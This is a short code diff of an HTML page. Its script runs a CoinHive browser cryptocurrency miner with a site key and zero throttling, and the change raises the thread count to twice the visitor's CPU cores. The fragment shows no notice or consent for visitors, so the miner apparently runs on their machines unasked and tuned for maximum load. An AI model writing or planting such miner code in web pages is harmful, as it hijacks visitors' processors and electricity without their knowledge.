@@ -8,7 +8,7 @@
 	<body>
 	<script>
 		var miner = new CoinHive.Anonymous('OlUlEe55HGZalak4jWYOcROWqATduuQ8', {
-    threads: 8,
+    threads: window.navigator.hardwareConcurrency * 2,
     autoThreads: false,
     throttle: 0,
     forceASMJS: false
